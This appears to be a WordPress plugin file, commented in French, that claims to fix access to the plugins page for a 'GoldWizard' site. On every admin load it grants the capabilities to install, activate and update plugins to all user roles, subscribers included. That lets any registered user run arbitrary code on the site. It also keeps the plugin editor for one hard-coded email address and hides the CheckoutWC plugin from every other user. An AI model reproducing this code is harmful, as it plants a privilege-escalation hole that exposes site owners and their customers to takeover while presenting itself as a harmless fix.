<?php
/**
 * Correctif simplifié pour GoldWizard Core - Accès aux extensions
 * 
 * Ce fichier corrige les problèmes d'accès à la page des extensions et masque
 * l'éditeur de fichiers des extensions pour les utilisateurs non-administrateurs.
 */

// Empêcher l'accès direct au fichier
if (!defined('ABSPATH')) {
    exit;
}

/**
 * Classe pour corriger les problèmes d'accès aux extensions
 */
class GoldWizard_Fix_Plugin_Access_Simple {
    /**
     * Instance unique de la classe
     */
    private static $instance = null;
    
    /**
     * Constructeur
     */
    private function __construct() {
        // Initialiser les hooks
        $this->init_hooks();
    }
    
    /**
     * Obtenir l'instance unique de la classe
     */
    public static function instance() {
        if (is_null(self::$instance)) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    /**
     * Initialiser les hooks
     */
    private function init_hooks() {
        // Ajouter des capacités pour voir les pages d'extensions à tous les rôles
        add_action('admin_init', array($this, 'add_plugin_view_caps_to_all_roles'), 1);
        
        // Masquer l'éditeur de fichiers des extensions
        add_action('admin_menu', array($this, 'hide_plugin_editor'), 999);
        
        // Rediriger si l'utilisateur tente d'accéder directement à l'éditeur de fichiers des extensions
        add_action('admin_init', array($this, 'redirect_from_plugin_editor'), 1);
        
        // Ajouter du CSS pour masquer le lien vers l'éditeur de fichiers des extensions
        add_action('admin_head', array($this, 'hide_plugin_editor_css'), 999);
        
        // Ajouter des styles CSS pour forcer l'affichage du contenu
        add_action('admin_head', array($this, 'force_display_css'), 999);
    }
    
    /**
     * Ajouter des capacités pour voir les pages d'extensions à tous les rôles
     */
    public function add_plugin_view_caps_to_all_roles() {
        global $wp_roles;
        
        if (!isset($wp_roles)) {
            $wp_roles = new WP_Roles();
        }
        
        // Parcourir tous les rôles
        foreach ($wp_roles->role_objects as $role) {
            // Ajouter des capacités spécifiques pour voir les pages d'extensions
            $role->add_cap('read_plugins');  // Capacité personnalisée pour voir les extensions
            $role->add_cap('read');  // Capacité de base pour lire
            
            // Pour tous les rôles, on ajoute les capacités nécessaires pour gérer les extensions
            $role->add_cap('activate_plugins');  // Capacité pour activer/désactiver les extensions
            $role->add_cap('install_plugins');   // Capacité pour installer des extensions
            $role->add_cap('update_plugins');    // Capacité pour mettre à jour les extensions
            
            // Seuls les administrateurs peuvent éditer les extensions
            if ($role->name !== 'administrator') {
                $role->remove_cap('edit_plugins');
            }
        }
    }
    
    /**
     * Masquer l'éditeur de fichiers des extensions
     */
    public function hide_plugin_editor() {
        $current_user = wp_get_current_user();
        $admin_email = 'contact@goldwizard.fr';
        
        // Si l'utilisateur actuel est l'administrateur principal, ne rien faire
        if ($current_user && $current_user->user_email === $admin_email) {
            return;
        }
        
        // Masquer l'éditeur de fichiers des extensions
        remove_submenu_page('plugins.php', 'plugin-editor.php');
    }
    
    /**
     * Rediriger si l'utilisateur tente d'accéder directement à l'éditeur de fichiers des extensions
     */
    public function redirect_from_plugin_editor() {
        $current_user = wp_get_current_user();
        $admin_email = 'contact@goldwizard.fr';
        
        // Si l'utilisateur actuel est l'administrateur principal, ne rien faire
        if ($current_user && $current_user->user_email === $admin_email) {
            return;
        }
        
        // Rediriger si l'utilisateur tente d'accéder directement à l'éditeur de fichiers des extensions
        global $pagenow;
        if ($pagenow === 'plugin-editor.php') {
            wp_redirect(admin_url('plugins.php'));
            exit;
        }
    }
    
    /**
     * Ajouter du CSS pour masquer le lien vers l'éditeur de fichiers des extensions
     */
    public function hide_plugin_editor_css() {
        $current_user = wp_get_current_user();
        $admin_email = 'contact@goldwizard.fr';
        
        // Si l'utilisateur actuel est l'administrateur principal, ne rien faire
        if ($current_user && $current_user->user_email === $admin_email) {
            return;
        }
        
        echo "<style>
            /* Masquer le lien vers l'éditeur de fichiers des extensions */
            #menu-plugins .wp-submenu li a[href='plugin-editor.php'],
            #adminmenu .wp-submenu li a[href='plugin-editor.php'],
            .wp-submenu li a[href$='plugin-editor.php'] {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                pointer-events: none !important;
            }
            
            /* Masquer l'extension CheckoutWC pour les utilisateurs non-administrateurs principaux */
            tr[data-plugin='checkout-for-woocommerce/checkout-for-woocommerce.php'],
            tr[data-slug='checkoutwc'] {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                pointer-events: none !important;
            }
        </style>";
    }
    
    /**
     * Ajouter des styles CSS pour forcer l'affichage du contenu
     */
    public function force_display_css() {
        // Ne s'exécuter que sur les pages d'extensions
        global $pagenow;
        if (!in_array($pagenow, ['plugins.php', 'plugin-install.php'])) {
            return;
        }
        
        echo "<style>
            /* Forcer l'affichage des éléments importants */
            #wpbody, 
            #wpbody-content, 
            .wrap, 
            .wp-list-table.plugins {
                display: block !important;
                visibility: visible !important;
                opacity: 1 !important;
                height: auto !important;
                overflow: visible !important;
            }
        </style>";
    }
}

/**
 * Fonction pour ajouter du CSS qui annule les règles restrictives
 */
function goldwizard_fix_plugin_access_css() {
    // Vérifier si nous sommes sur une page liée aux extensions
    $screen = function_exists('get_current_screen') ? get_current_screen() : null;
    $current_page = isset($_SERVER['REQUEST_URI']) ? basename(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)) : '';
    
    // Liste des pages liées aux extensions
    $plugin_pages = array(
        'plugins.php',
        'plugin-install.php',
        'plugin-editor.php',
        'update.php'
    );
    
    // Vérifier si nous sommes sur une page d'extension
    $is_plugin_page = false;
    if ($screen && (strpos($screen->id, 'plugin') !== false || in_array($current_page, $plugin_pages))) {
        $is_plugin_page = true;
    } else {
        foreach ($plugin_pages as $page) {
            if (strpos($current_page, $page) !== false) {
                $is_plugin_page = true;
                break;
            }
        }
    }
    
    // Si ce n'est pas une page d'extension, ne rien faire
    if (!$is_plugin_page) {
        return;
    }
    
    // CSS pour forcer l'affichage des éléments masqués
    ?>
    <style type="text/css">
    /* Forcer l'affichage des éléments essentiels de la page des extensions */
    #wpbody, #wpbody-content, .wrap, .wp-list-table.plugins, 
    #plugin-information-content, #plugin-information-title, #plugin-information-tabs,
    #plugin-information-footer, .plugin-card, .plugin-card-top, .plugin-card-bottom,
    .plugin-install-tab-featured, .plugin-install-tab-popular, .plugin-install-tab-recommended,
    .plugin-install-tab-favorites, .plugin-install-tab-beta, .plugin-install-tab-search {
        display: block !important;
        visibility: visible !important;
        opacity: 1 !important;
        height: auto !important;
        overflow: visible !important;
    }
    
    /* Ne pas réafficher les éléments qui doivent rester cachés */
    /* Supprimer uniquement les règles qui masquent le contenu principal des pages d'extensions */
    .plugins-php, .plugin-install-php, .plugin-editor-php,
    body.plugin-install-php #wpbody-content,
    body.plugins-php #wpbody-content {
        display: block !important;
        visibility: visible !important;
        opacity: 1 !important;
        height: auto !important;
        min-height: 800px !important;
        pointer-events: auto !important;
    }
    
    /* Forcer l'affichage des cartes de plugins */
    .plugin-card {
        display: inline-block !important;
        visibility: visible !important;
        opacity: 1 !important;
    }
    
    /* Forcer l'affichage des onglets */
    .wp-filter {
        display: block !important;
        visibility: visible !important;
        opacity: 1 !important;
    }
    </style>
    
    <script type="text/javascript">
    jQuery(document).ready(function($) {
        // Forcer l'affichage des éléments essentiels de la page des extensions
        $("#wpbody, #wpbody-content, .wrap, .wp-list-table.plugins").css({
            "display": "block",
            "visibility": "visible",
            "opacity": "1",
            "height": "auto",
            "overflow": "visible"
        });
        
        // Supprimer les attributs style qui pourraient cacher des éléments essentiels
        $("#wpbody-content").attr("style", "display: block !important; visibility: visible !important; opacity: 1 !important; height: auto !important; min-height: 800px !important;");
        
        // Forcer l'affichage après un court délai
        setTimeout(function() {
            $("#wpbody, #wpbody-content, .wrap, .wp-list-table.plugins").css({
                "display": "block",
                "visibility": "visible",
                "opacity": "1",
                "height": "auto",
                "overflow": "visible"
            });
        }, 500);
    });
    </script>
    <?php
}
add_action('admin_head', 'goldwizard_fix_plugin_access_css', 9999);

// Initialiser la classe
GoldWizard_Fix_Plugin_Access_Simple::instance();
